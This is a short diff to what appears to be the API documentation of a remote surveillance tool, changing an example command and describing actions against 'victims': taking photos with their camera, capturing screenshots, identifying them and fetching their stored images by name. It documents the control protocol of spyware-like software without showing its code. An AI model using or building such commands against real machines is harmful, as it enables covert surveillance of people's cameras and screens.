@@ -153,9 +153,9 @@ For fetching victim's history images
     "command":      "execution",
     "content": 
         {
-            "session_id":   1,
+            "session_id":   -1,
             "action":       "history_images",
-            "para":         ""
+            "para":         "Aimin"
         }
 }
 ```
@@ -171,7 +171,8 @@ For fetching victim's history images
 1. picture:         take a picture using victims' camera (session_id specifies which victim to perform)
 2. screenshot:      get a screenshot of victim's machine (session_id specifies which victim to perform)
 3. identify:        identify victim (session_id specifies which victim to perform)
-3. history_images:  get all history images (screen shots or photos taken by users) for specific identified victim with session_id
+3. history_images:  get all history images (screen shots or photos taken by users) for specific identified victim.
+                    To fetch specific victim's images, you need to provide victim's name in para area
 
 
 ### Response Format
